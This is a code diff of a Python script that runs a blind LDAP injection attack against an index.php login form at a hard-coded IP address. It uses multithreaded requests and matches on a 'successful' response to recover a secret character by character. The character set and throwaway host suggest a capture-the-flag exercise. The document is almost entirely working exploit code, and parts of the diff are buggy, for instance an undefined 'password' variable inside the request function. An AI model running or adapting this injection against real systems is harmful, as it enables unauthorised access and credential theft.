@@ -9,15 +9,15 @@ import concurrent.futures
 
 # create character list
 def charlist():
-    chars= list(string.printable)
+    chars= list(string.ascii_lowercase + string.digits + '{}_')
     return chars
 
 def ldap_injection(char):
-    url="94.237.59.63:32716" # update url
+    url="83.136.252.57:42171" # update url
     proxies={"http":"http://127.0.0.1:8080"}
     headers={"Content-type":"application/x-www-form-urlencoded"}
     session= requests.Session()
-    data=f"username=admin)(|(description=h{char}*&password=test)"
+    data=f"username=admin)(|(description={password}{char}*&password=test)"
     response= session.post(url=f"http://{url}/index.php", proxies=proxies, allow_redirects=True, headers=headers, data=data)
     
     process= subprocess.Popen("grep -i successful", shell=True, text=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -28,15 +28,22 @@ def ldap_injection(char):
         return None
     
 try:
-    chars = charlist()
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-        future_to_test = {executor.submit(ldap_injection,char): (char) for char in chars}
-        for future in concurrent.futures.as_completed(future_to_test):
-            char = future_to_test[future]
-            result = future.result()
-            if result is not None:
-                print(f"Found char: {result}")                                    
-            else:
-                pass
+    password= ""
+    count= 0
+    while count < 40:
+        chars = charlist()
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            future_to_test = {executor.submit(ldap_injection,char): (char) for char in chars}
+            for future in concurrent.futures.as_completed(future_to_test):
+                char = future_to_test[future]
+                result = future.result()
+                if result is not None:
+                    print(f"Found char: {result}")
+                    password +=result
+                    count=0                                   
+                else:
+                    count+=1
+                    pass
+    print(password)
 except KeyboardInterrupt:
     print("ctrl + c detected, exiting gracefully")
